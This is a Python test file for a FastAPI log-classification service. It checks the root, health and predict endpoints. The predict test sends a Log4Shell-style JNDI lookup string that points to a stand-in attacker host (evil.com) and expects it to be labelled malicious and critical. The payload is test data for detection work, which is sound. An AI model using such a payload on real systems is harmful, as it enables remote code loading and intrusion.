from fastapi.testclient import TestClient

from api.main import app


def test_root_endpoint_points_to_docs_and_health():
    client = TestClient(app)
    response = client.get("/")
    assert response.status_code == 200
    payload = response.json()
    assert payload["status"] == "ok"
    assert payload["docs"] == "/docs"
    assert payload["health"] == "/health"


def test_health_endpoint():
    client = TestClient(app)
    response = client.get("/health")
    assert response.status_code == 200
    assert response.json()["status"] == "ok"


def test_predict_endpoint():
    client = TestClient(app)
    response = client.post("/predict", json={"log": "GET /?x=${jndi:ldap://evil.com/a}"})
    assert response.status_code == 200
    payload = response.json()
    assert payload["label"] == "malicious"
    assert payload["risk_level"] == "critical"
